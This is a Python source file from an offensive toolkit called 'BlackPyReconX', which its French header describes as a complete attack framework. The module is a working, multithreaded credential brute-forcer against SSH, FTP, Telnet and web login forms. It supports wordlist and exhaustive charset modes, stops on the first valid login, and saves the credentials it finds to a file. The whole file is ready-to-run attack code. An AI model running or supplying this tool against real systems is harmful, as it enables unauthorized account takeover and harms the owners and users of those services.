# BlackPyReconX - Un framework d'attaque complet
# Copyright (C) 2025 Hermann KEKE
#
# Ce programme est un logiciel libre ; vous pouvez le redistribuer et/ou le
# modifier selon les termes de la Licence publique générale GNU telle que
# publiée par la Free Software Foundation ; soit la version 3 de la Licence,
# soit (à votre choix) toute version ultérieure.
#
# Ce programme est distribué dans l'espoir qu'il sera utile,
# mais SANS AUCUNE GARANTIE ; sans même la garantie implicite de
# QUALITÉ MARCHANDE ou d'ADÉQUATION À UN USAGE PARTICULIER. Voir la
# Licence publique générale GNU pour plus de détails.
#
# Vous devriez avoir reçu une copie de la Licence publique générale GNU
# avec ce programme. Si non, voir <https://www.gnu.org/licenses/>.

import threading
import time
import queue
import itertools
import string
import paramiko
import ftplib
import asyncio
import telnetlib3
import socket
import requests # Ajouté pour le brute-force web
from functools import partial # Ajouté pour simplifier les appels de fonction
from tqdm import tqdm
from . import utils
import logging

logger = logging.getLogger(__name__)
logger.setLevel(logging.DEBUG) # Ensure debug messages are processed

# --- Session de requêtes (passée depuis main.py) ---
session = None

# --- Global State ---
bruteforce_state = {
    "running": False,
    "target": None,
    "port": None,
    "service": None,
    "threads": [],
    "found_credentials": None,
    "lock": threading.Lock(),
    "stop_event": threading.Event(),
    "credential_queue": queue.Queue(),
    "total_combinations": 0,
    "pbar": None
}

# --- Connection Functions ---
# Each function now accepts a timeout and is designed to fail gracefully.

def _try_ssh(target, port, username, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, port=port, username=username, password=password, timeout=timeout, banner_timeout=timeout)
        return True
    except paramiko.AuthenticationException:
        return False # Correct password would not raise this
    except Exception:
        return False # Any other error (timeout, connection refused) is a failure
    finally:
        client.close()

def _try_ftp(target, port, username, password, timeout):
    try:
        with ftplib.FTP(timeout=timeout) as ftp:
            ftp.connect(target, port)
            ftp.login(username, password)
            ftp.quit()
            return True
    except (ftplib.error_perm, ftplib.error_temp, socket.timeout, ConnectionRefusedError, OSError):
        return False

async def _try_telnet_async(target, port, username, password, timeout):
    try:
        reader, writer = await telnetlib3.open_connection(target, port, shell=False, timeout=timeout)
        await reader.readuntil(b"login:", timeout=2)
        writer.write(username.encode('ascii') + b'\n')
        await reader.readuntil(b"Password:", timeout=2)
        writer.write(password.encode('ascii') + b'\n')
        result = await reader.read(1024)
        writer.close()
        return b"incorrect" not in result.lower()
    except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
        return False

def _try_telnet(target, port, username, password, timeout):
    return asyncio.run(_try_telnet_async(target, port, username, password, timeout))

def _try_web(url, username, password, options):
    """
    Tente de s'authentifier contre un formulaire web.
    `options` doit contenir :
    - user_field, pass_field, fail_string, timeout
    """
    payload = {
        options['user_field']: username,
        options['pass_field']: password
    }
    try:
        # La session requests est maintenant passée via le module
        response = session.post(url, data=payload, timeout=options.get('timeout', 5))
        # Un succès est quand la chaîne d'échec N'EST PAS dans la réponse
        return options['fail_string'] not in response.text
    except requests.RequestException as e:
        logger.debug(f"[WEB] La requête a échoué : {e}")
        return False

# --- Worker & Setup ---

SUPPORTED_SERVICES = {
    'ssh': _try_ssh,
    'ftp': _try_ftp,
    'telnet': _try_telnet,
    'web': _try_web, # Ajout du service web
}

def _bruteforce_worker(q, pbar, service_func, verbose, single_username):
    """Prend un mot de passe de la file d'attente et le teste contre un nom d'utilisateur unique."""
    thread_name = threading.current_thread().name
    logger.debug(f"[{thread_name}] Worker (bruteforce) démarré pour l'utilisateur '{single_username}'.")
    while not bruteforce_state["stop_event"].is_set():
        try:
            password = q.get_nowait()
            if verbose:
                tqdm.write(f"[VERBOSE] Test: {single_username}:{password}")
            
            if service_func(single_username, password):
                with bruteforce_state["lock"]:
                    bruteforce_state["found_credentials"] = (single_username, password)
                bruteforce_state["stop_event"].set()
                tqdm.write(f"\n[+] SUCCÈS ! Identifiants trouvés : {single_username}:{password}")
        except queue.Empty:
            logger.debug(f"[{thread_name}] File d'attente vide, worker en sortie.")
            return
        except Exception as e:
            logger.debug(f"[{thread_name}] Erreur en testant {single_username}:{password or ''}: {e}")
        finally:
            if pbar: pbar.update(1)
            q.task_done()
    logger.debug(f"[{thread_name}] Worker arrêté à cause du stop_event.")


def _dictionary_worker(q, pbar, service_func, verbose):
    """Prend un couple (utilisateur, mot de passe) de la file d'attente et le teste."""
    thread_name = threading.current_thread().name
    logger.debug(f"[{thread_name}] Worker (dictionnaire) démarré.")
    while not bruteforce_state["stop_event"].is_set():
        try:
            username, password = q.get_nowait()
            if verbose:
                tqdm.write(f"[VERBOSE] Test: {username}:{password}")

            if service_func(username, password):
                with bruteforce_state["lock"]:
                    bruteforce_state["found_credentials"] = (username, password)
                bruteforce_state["stop_event"].set()
                tqdm.write(f"\n[+] SUCCÈS ! Identifiants trouvés : {username}:{password}")
        except queue.Empty:
            logger.debug(f"[{thread_name}] File d'attente vide, worker en sortie.")
            return
        except Exception as e:
            logger.debug(f"[{thread_name}] Erreur en testant {username}:{password}: {e}")
        finally:
            if pbar: pbar.update(1)
            q.task_done()
    logger.debug(f"[{thread_name}] Worker arrêté à cause du stop_event.")

# --- Password Generation ---

def get_charset(charset_name):
    charsets = {
        'alphanum': string.ascii_letters + string.digits,
        'alpha': string.ascii_letters,
        'lower': string.ascii_lowercase,
        'upper': string.ascii_uppercase,
        'digits': string.digits,
        'all': string.ascii_letters + string.digits + string.punctuation
    }
    return charsets.get(charset_name, charset_name)

def generate_passwords(charset, min_len, max_len):
    actual_charset = get_charset(charset)
    for length in range(min_len, max_len + 1):
        for p in itertools.product(actual_charset, repeat=length):
            if bruteforce_state["stop_event"].is_set(): return
            yield ''.join(p)

# --- Main Runner Function ---

def start_bruteforce(attack_type, options):
    global bruteforce_state
    logger.debug(f"[start_bruteforce] Appelé avec attack_type: {attack_type}, options: {options}")
    
    with bruteforce_state["lock"]:
        if bruteforce_state["running"]:
            utils.log_message('!', "Une attaque par force brute est déjà en cours.")
            return

        target_display = options.get('url', options.get('target'))
        utils.log_message('*', f"Démarrage de l'attaque '{attack_type}' sur {target_display}")
        
        # Réinitialisation de l'état
        bruteforce_state.update({
            "running": True, "target": options.get('target'), "port": options.get('port'),
            "service": options.get('service'), "threads": [], "found_credentials": None,
            "credential_queue": queue.Queue(), "total_combinations": 0, "pbar": None
        })
        bruteforce_state["stop_event"].clear()

    service_func_base = SUPPORTED_SERVICES.get(options['service'])
    if not service_func_base:
        utils.log_message('-', f"Service '{options['service']}' non supporté.")
        bruteforce_state["running"] = False
        return

    # Préparation de la fonction de service avec une signature unifiée : func(username, password) -> bool
    # Cela simplifie grandement les workers.
    if options['service'] == 'web':
        # Les options web sont requises ici
        if not all(k in options for k in ['url', 'user_field', 'pass_field', 'fail_string']):
            utils.log_message('-', "Pour le service 'web', les options --url, --user-field, --pass-field, et --fail-string sont requises.")
            bruteforce_state["running"] = False
            return
        # La session est une variable globale du module, passée par main.py
        options['session'] = session
        service_func = partial(_try_web, options['url'], options=options)
    else:
        # Pour les autres services (ssh, ftp, telnet)
        service_func = partial(service_func_base, options['target'], options['port'], timeout=options.get('timeout', 5))

    try:
        q = bruteforce_state["credential_queue"]
        if attack_type == 'dictionary':
            with open(options['userlist'], 'r', errors='ignore') as f_users:
                users = [line.strip() for line in f_users if line.strip()]
            with open(options['passlist'], 'r', errors='ignore') as f_pass:
                passwords = [line.strip() for line in f_pass if line.strip()]
            
            for user in users:
                for password in passwords:
                    q.put((user, password))
            bruteforce_state["total_combinations"] = len(users) * len(passwords)
            worker_target = partial(_dictionary_worker, service_func=service_func, verbose=options.get('verbose', False))
        
        elif attack_type == 'bruteforce':
            username_to_attack = options.get('username')
            if not username_to_attack:
                raise ValueError("Le nom d'utilisateur est requis pour le mode force brute pure.")
            
            pass_gen = generate_passwords(options['charset'], options['min_len'], options['max_len'])
            # Pré-remplir la file d'attente pour avoir le compte total
            all_passwords = list(pass_gen)
            for p in all_passwords:
                q.put(p)
            bruteforce_state["total_combinations"] = len(all_passwords)
            worker_target = partial(_bruteforce_worker, service_func=partial(service_func, username=username_to_attack), verbose=options.get('verbose', False), single_username=username_to_attack)

    except (FileNotFoundError, KeyError, ValueError) as e:
        utils.log_message('-', f"Erreur de configuration : {e}")
        bruteforce_state["running"] = False
        return

    if q.qsize() == 0:
        utils.log_message('-', "Aucune combinaison utilisateur/mot de passe à tester.")
        bruteforce_state["running"] = False
        return

    bruteforce_state["pbar"] = tqdm(total=bruteforce_state["total_combinations"], desc=f"Attaque {attack_type.capitalize()}", unit="creds")
    
    # Démarrage des threads
    for _ in range(options.get('threads', 50)):
        thread = threading.Thread(target=worker_target, args=(q, bruteforce_state["pbar"]), daemon=True)
        thread.start()
        bruteforce_state["threads"].append(thread)

def stop_bruteforce():
    global bruteforce_state
    logger.debug(f"[stop_bruteforce] Appelé. bruteforce_state['running']: {bruteforce_state['running']}")
    with bruteforce_state["lock"]:
        if not bruteforce_state["running"]:
            return
        utils.log_message('+', "Arrêt de l'attaque par force brute.")
        bruteforce_state["stop_event"].set()
        
        # Vider la file d'attente pour débloquer les threads en attente sur q.get()
        while not bruteforce_state["credential_queue"].empty():
            try:
                bruteforce_state["credential_queue"].get_nowait()
                bruteforce_state["credential_queue"].task_done()
            except queue.Empty:
                break
        
        bruteforce_state["running"] = False
        logger.debug(f"[stop_bruteforce] État mis à jour : running={bruteforce_state['running']}, stop_event={bruteforce_state['stop_event'].is_set()}")

def get_status():
    with bruteforce_state["lock"]:
        return {
            "running": bruteforce_state["running"],
            "target": bruteforce_state.get('target'),
            "service": bruteforce_state.get('service'),
            "progress": f"{bruteforce_state.get('total_combinations', 0) - bruteforce_state.get('credential_queue', queue.Queue()).qsize()}/{bruteforce_state.get('total_combinations', 0)}",
            "found": bruteforce_state.get('found_credentials')
        }

def run(attack_type, options):
    start_bruteforce(attack_type, options)

    try:
        while bruteforce_state["running"] and not bruteforce_state["stop_event"].is_set():
            time.sleep(1) # Garde le thread principal en vie, permettant l'interruption clavier
            
    except KeyboardInterrupt:
        utils.log_message('!', "\nInterruption manuelle détectée. Arrêt de l'attaque par force brute...")
        # stop_bruteforce() sera appelé dans le bloc finally
    finally:
        if bruteforce_state["pbar"] and not bruteforce_state["pbar"].closed:
            bruteforce_state["pbar"].close()
        if bruteforce_state["running"]:
            stop_bruteforce()

    if bruteforce_state["found_credentials"]:
        utils.log_message('+', f"Identifiants trouvés : {bruteforce_state['found_credentials'][0]}:{bruteforce_state['found_credentials'][1]}")
        with open("outputs/bruteforce_credentials.txt", "a") as f:
            f.write(f"{options.get('url', options.get('target'))} ({options.get('service')}) - {bruteforce_state['found_credentials'][0]}:{bruteforce_state['found_credentials'][1]}\n")
    else:
        utils.log_message('-', "Aucun identifiant valide trouvé avec les paramètres donnés.")

    return bruteforce_state["found_credentials"]